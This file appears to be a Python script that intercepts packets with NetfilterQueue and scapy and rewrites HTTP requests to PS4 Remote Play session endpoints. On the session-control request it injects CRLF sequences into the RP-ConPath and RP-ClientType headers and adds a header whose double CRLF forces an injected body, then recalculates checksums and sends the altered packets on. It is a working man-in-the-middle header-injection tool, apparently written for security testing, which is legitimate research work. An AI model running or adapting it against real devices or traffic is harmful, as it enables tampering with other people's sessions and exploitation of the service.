from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import re
# Define header operations for each specific request
REQUEST_OPERATIONS = {
    # For session registration
    b"POST /sie/ps4/rp/sess/rgst HTTP/1.1": {
        'modify': {
           },
        'add': [      
        ]
    },
    # For session initialization
    b"GET /sie/ps4/rp/sess/init HTTP/1.1": {
        'modify': {      
        },
        'add': [     
        ]
    },
    # For session control
    b"GET /sie/ps4/rp/sess/ctrl HTTP/1.1": {
        'modify': {
        b"RP-ConPath: ": b"RP-ConPath: 1\r\nInjected-Header: injected",
        b"RP-ClientType: ": b"RP-ClientType: 11\r\nX-Second-Injection: true"
    },
    'add': [
        b"X-CRLF-Test: before\r\n\r\ninjected-body\r\n\r\n"
    ]
}
}
def modify_http(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP):
        raw = scapy_pkt[Raw].load        
        # Check which request this packet contains (if any)
        current_request = None
        for request in REQUEST_OPERATIONS.keys():
            if request in raw:
                current_request = request
                break       
        if current_request:
            modified = False
            modified_raw = raw           
            # Modify existing headers if they exist
            if 'modify' in REQUEST_OPERATIONS[current_request]:
                for search, replace in REQUEST_OPERATIONS[current_request]['modify'].items():
                    if search in modified_raw:
                        pattern = re.compile(re.escape(search) + b'.*')
                        modified_raw = pattern.sub(replace, modified_raw)
                        modified = True           
            # Add new headers (only if this is a request we're handling)
            if 'add' in REQUEST_OPERATIONS[current_request]:
                # Find the end of headers (double CRLF)
                header_end = modified_raw.find(b"\r\n\r\n")
                if header_end != -1:
                    # Insert new headers before the end of headers
                    new_headers = b"".join(REQUEST_OPERATIONS[current_request]['add'])
                    modified_raw = modified_raw[:header_end] + new_headers + modified_raw[header_end:]
                    modified = True
            if modified:
                print(f"🔧 Modified packet for {current_request.decode('utf-8', errors='ignore')}")              
                # Update payload
                scapy_pkt[Raw].load = modified_raw
                # Recalculate checksums and length
                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[TCP].chksum
                pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()
# Bind to NetfilterQueue (set up iptables rule to queue packets here)
nfqueue = NetfilterQueue()
nfqueue.bind(1, modify_http)
print("🚦 Listening for packets... Press Ctrl+C to exit.")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("❌ Exiting...")
    nfqueue.unbind()